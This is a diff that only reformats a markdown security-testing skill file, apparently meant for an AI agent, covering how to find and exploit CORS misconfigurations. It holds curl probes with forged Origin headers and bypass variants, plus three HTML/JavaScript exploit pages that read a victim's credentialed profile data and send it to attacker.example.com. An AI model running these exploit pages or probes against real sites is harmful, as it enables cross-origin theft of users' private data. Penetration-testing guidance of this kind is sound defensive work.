@@ -1,8 +1,8 @@
 ---
 name: testing-cors-misconfiguration
 description: Identifying and exploiting Cross-Origin Resource Sharing misconfigurations
-  that allow unauthorized cross-domain data access and credential theft during security
-  assessments.
+ that allow unauthorized cross-domain data access and credential theft during security
+ assessments.
 domain: cybersecurity
 subdomain: web-application-security
 tags:
@@ -56,26 +56,26 @@ Check all API endpoints for CORS response headers.
 ```bash
 # Test with a foreign Origin header
 curl -s -I \
-  -H "Origin: https://evil.example.com" \
-  "https://api.target.example.com/api/user/profile"
+ -H "Origin: https://evil.example.com" \
+ "https://api.target.example.com/api/user/profile"
 
 # Check for CORS headers in response:
-# Access-Control-Allow-Origin: https://evil.example.com  (BAD: reflects any origin)
-# Access-Control-Allow-Origin: *  (BAD if with credentials)
-# Access-Control-Allow-Credentials: true  (allows cookies)
+# Access-Control-Allow-Origin: https://evil.example.com (BAD: reflects any origin)
+# Access-Control-Allow-Origin: * (BAD if with credentials)
+# Access-Control-Allow-Credentials: true (allows cookies)
 # Access-Control-Allow-Methods: GET, POST, PUT, DELETE
 # Access-Control-Allow-Headers: Authorization, Content-Type
 # Access-Control-Expose-Headers: X-Custom-Header
 
 # Test multiple endpoints
 for endpoint in /api/user/profile /api/user/settings /api/transactions \
-  /api/admin/users /api/account/balance; do
-  echo "=== $endpoint ==="
-  curl -s -I \
-    -H "Origin: https://evil.example.com" \
-    "https://api.target.example.com$endpoint" | \
-    grep -i "access-control"
-  echo
+ /api/admin/users /api/account/balance; do
+ echo "=== $endpoint ==="
+ curl -s -I \
+ -H "Origin: https://evil.example.com" \
+ "https://api.target.example.com$endpoint" | \
+ grep -i "access-control"
+ echo
 done
 ```
 
@@ -86,34 +86,34 @@ Determine how the server validates the Origin header.
 ```bash
 # Test 1: Arbitrary origin reflection
 curl -s -I -H "Origin: https://evil.com" \
-  "https://api.target.example.com/api/user/profile" | grep -i "access-control-allow-origin"
+ "https://api.target.example.com/api/user/profile" | grep -i "access-control-allow-origin"
 
 # Test 2: Null origin
 curl -s -I -H "Origin: null" \
-  "https://api.target.example.com/api/user/profile" | grep -i "access-control-allow-origin"
+ "https://api.target.example.com/api/user/profile" | grep -i "access-control-allow-origin"
 
 # Test 3: Subdomain matching bypass
 curl -s -I -H "Origin: https://evil.target.example.com" \
-  "https://api.target.example.com/api/user/profile" | grep -i "access-control-allow-origin"
+ "https://api.target.example.com/api/user/profile" | grep -i "access-control-allow-origin"
 
 # Test 4: Prefix/suffix matching bypass
 curl -s -I -H "Origin: https://target.example.com.evil.com" \
-  "https://api.target.example.com/api/user/profile" | grep -i "access-control-allow-origin"
+ "https://api.target.example.com/api/user/profile" | grep -i "access-control-allow-origin"
 
 curl -s -I -H "Origin: https://eviltarget.example.com" \
-  "https://api.target.example.com/api/user/profile" | grep -i "access-control-allow-origin"
+ "https://api.target.example.com/api/user/profile" | grep -i "access-control-allow-origin"
 
 # Test 5: Protocol downgrade
 curl -s -I -H "Origin: http://target.example.com" \
-  "https://api.target.example.com/api/user/profile" | grep -i "access-control-allow-origin"
+ "https://api.target.example.com/api/user/profile" | grep -i "access-control-allow-origin"
 
 # Test 6: Special characters in origin
 curl -s -I -H "Origin: https://target.example.com%60.evil.com" \
-  "https://api.target.example.com/api/user/profile" | grep -i "access-control-allow-origin"
+ "https://api.target.example.com/api/user/profile" | grep -i "access-control-allow-origin"
 
 # Test 7: Wildcard with credentials check
 curl -s -I -H "Origin: https://evil.com" \
-  "https://api.target.example.com/api/public" | grep -iE "access-control-allow-(origin|credentials)"
+ "https://api.target.example.com/api/public" | grep -iE "access-control-allow-(origin|credentials)"
 # Wildcard (*) + credentials (true) is invalid per spec but some servers misconfigure
 ```
 
@@ -124,10 +124,10 @@ Assess how the server handles OPTIONS preflight requests.
 ```bash
 # Send preflight request
 curl -s -I -X OPTIONS \
-  -H "Origin: https://evil.example.com" \
-  -H "Access-Control-Request-Method: PUT" \
-  -H "Access-Control-Request-Headers: Authorization, Content-Type" \
-  "https://api.target.example.com/api/user/profile"
+ -H "Origin: https://evil.example.com" \
+ -H "Access-Control-Request-Method: PUT" \
+ -H "Access-Control-Request-Headers: Authorization, Content-Type" \
+ "https://api.target.example.com/api/user/profile"
 
 # Check:
 # Access-Control-Allow-Methods: should only list needed methods
@@ -136,17 +136,17 @@ curl -s -I -X OPTIONS \
 
 # Test if dangerous methods are allowed
 curl -s -I -X OPTIONS \
-  -H "Origin: https://evil.example.com" \
-  -H "Access-Control-Request-Method: DELETE" \
-  "https://api.target.example.com/api/user/profile" | \
-  grep -i "access-control-allow-methods"
+ -H "Origin: https://evil.example.com" \
+ -H "Access-Control-Request-Method: DELETE" \
+ "https://api.target.example.com/api/user/profile" | \
+ grep -i "access-control-allow-methods"
 
 # Test if preflight is cached too long
 curl -s -I -X OPTIONS \
-  -H "Origin: https://evil.example.com" \
-  -H "Access-Control-Request-Method: GET" \
-  "https://api.target.example.com/api/user/profile" | \
-  grep -i "access-control-max-age"
+ -H "Origin: https://evil.example.com" \
+ -H "Access-Control-Request-Method: GET" \
+ "https://api.target.example.com/api/user/profile" | \
+ grep -i "access-control-max-age"
 # max-age > 86400 (1 day) allows prolonged abuse after policy change
 ```
 
@@ -165,19 +165,19 @@ Build an HTML page that exploits the CORS misconfiguration to steal data.
 // Exploit: Read victim's profile data cross-origin
 var xhr = new XMLHttpRequest();
 xhr.onreadystatechange = function() {
-  if (xhr.readyState === 4) {
-    // Data successfully stolen cross-origin
-    document.getElementById('result').innerText = xhr.responseText;
+ if (xhr.readyState === 4) {
+ // Data successfully stolen cross-origin
+ document.getElementById('result').innerText = xhr.responseText;
 
-    // Exfiltrate to attacker server
-    var exfil = new XMLHttpRequest();
-    exfil.open('POST', 'https://attacker.example.com/collect', true);
-    exfil.setRequestHeader('Content-Type', 'application/json');
-    exfil.send(xhr.responseText);
-  }
+ // Exfiltrate to attacker server
+ var exfil = new XMLHttpRequest();
+ exfil.open('POST', 'https://attacker.example.com/collect', true);
+ exfil.setRequestHeader('Content-Type', 'application/json');
+ exfil.send(xhr.responseText);
+ }
 };
 xhr.open('GET', 'https://api.target.example.com/api/user/profile', true);
-xhr.withCredentials = true;  // Include victim's cookies
+xhr.withCredentials = true; // Include victim's cookies
 xhr.send();
 </script>
 </body>
@@ -188,16 +188,16 @@ xhr.send();
 <!-- Exploit using fetch API -->
 <script>
 fetch('https://api.target.example.com/api/user/profile', {
-  credentials: 'include'
+ credentials: 'include'
 })
 .then(response => response.json())
 .then(data => {
-  // Steal sensitive data
-  fetch('https://attacker.example.com/collect', {
-    method: 'POST',
-    body: JSON.stringify(data)
-  });
-  console.log('Stolen data:', data);
+ // Steal sensitive data
+ fetch('https://attacker.example.com/collect', {
+ method: 'POST',
+ body: JSON.stringify(data)
+ });
+ console.log('Stolen data:', data);
 });
 </script>
 ```
@@ -212,25 +212,25 @@ If `Origin: null` is allowed, exploit via sandboxed iframes.
 <body>
 <h1>Null Origin CORS Exploit</h1>
 <!--
-  Sandboxed iframe sends requests with Origin: null
-  If server reflects Access-Control-Allow-Origin: null with credentials,
-  data can be exfiltrated
+ Sandboxed iframe sends requests with Origin: null
+ If server reflects Access-Control-Allow-Origin: null with credentials,
+ data can be exfiltrated
 -->
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms"
-  srcdoc="
-  <script>
-    var xhr = new XMLHttpRequest();
-    xhr.onload = function() {
-      // Send stolen data to parent or attacker server
-      fetch('https://attacker.example.com/collect', {
-        method: 'POST',
-        body: xhr.responseText
-      });
-    };
-    xhr.open('GET', 'https://api.target.example.com/api/user/profile');
-    xhr.withCredentials = true;
-    xhr.send();
-  </script>
+ srcdoc="
+ <script>
+ var xhr = new XMLHttpRequest();
+ xhr.onload = function() {
+ // Send stolen data to parent or attacker server
+ fetch('https://attacker.example.com/collect', {
+ method: 'POST',
+ body: xhr.responseText
+ });
+ };
+ xhr.open('GET', 'https://api.target.example.com/api/user/profile');
+ xhr.withCredentials = true;
+ xhr.send();
+ </script>
 "></iframe>
 </body>
 </html>
@@ -246,23 +246,23 @@ Check if CORS allows access from internal origins that could be leveraged via XS
 ```bash
 # Test internal/development origins
 INTERNAL_ORIGINS=(
-  "http://localhost"
-  "http://localhost:3000"
-  "http://localhost:8080"
-  "http://127.0.0.1"
-  "http://192.168.1.1"
-  "http://10.0.0.1"
-  "https://staging.target.example.com"
-  "https://dev.target.example.com"
-  "https://test.target.example.com"
+ "http://localhost"
+ "http://localhost:3000"
+ "http://localhost:8080"
+ "http://127.0.0.1"
+ "http://192.168.1.1"
+ "http://10.0.0.1"
+ "https://staging.target.example.com"
+ "https://dev.target.example.com"
+ "https://test.target.example.com"
 )
 
 for origin in "${INTERNAL_ORIGINS[@]}"; do
-  echo -n "$origin: "
-  curl -s -I -H "Origin: $origin" \
-    "https://api.target.example.com/api/user/profile" | \
-    grep -i "access-control-allow-origin" | tr -d '\r'
-  echo
+ echo -n "$origin: "
+ curl -s -I -H "Origin: $origin" \
+ "https://api.target.example.com/api/user/profile" | \
+ grep -i "access-control-allow-origin" | tr -d '\r'
+ echo
 done
 
 # If internal origins are allowed and have XSS:
